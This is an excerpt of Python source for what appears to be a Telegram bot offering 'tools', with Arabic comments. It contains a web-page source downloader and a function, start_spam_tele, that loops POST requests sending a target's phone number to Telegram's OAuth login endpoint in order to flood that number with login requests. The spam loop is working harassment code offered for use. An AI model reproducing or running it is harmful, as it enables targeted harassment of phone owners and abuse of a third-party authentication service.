...
def main_keyboard(user_id):
    ...
    markup.add(btn_ip, btn_sc)       # الأدوات الجديدة هنا
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5, btn6)
    markup.add(btn_fake, btn_web)
    markup.add(btn_sys, btn_tips, btn_info)
...
def process_source_code_download(message):
    ...
    try:
        ...
        if response.status_code == 200:
            # استخدام BytesIO لإنشاء ملف في الذاكرة دون حفظه على القرص
...
def start_spam_tele(message, phone):
    ...
    def run():
        ...
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False): break
            try: 
                if requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', data={'phone': phone}, timeout=5).text == "true": success += 1
            except: pass
            time.sleep(1.0)
